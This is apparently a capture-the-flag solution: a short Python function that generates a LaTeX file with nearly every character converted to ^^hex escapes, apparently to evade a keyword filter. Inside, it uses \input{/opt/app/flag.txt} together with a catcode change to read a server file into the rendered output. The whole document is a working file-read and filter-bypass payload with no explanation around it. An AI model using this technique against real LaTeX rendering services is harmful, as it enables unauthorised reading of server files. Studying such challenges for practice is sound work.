def make_tex():

    def to_hex(s:str):
        h=''
        for c in s:
            if not c in 'abcdef0123456789\n\t ':
                h+='^^'+hex(ord(c))[2:]
            else:
                h+=c
        return h

    text=r'''\documentclass{article}
\title{YOOO}
\begin{document}
\maketitle

\catcode `\_=12
\input{/opt/app/flag.txt}


\end{document}
'''
    return to_hex(text)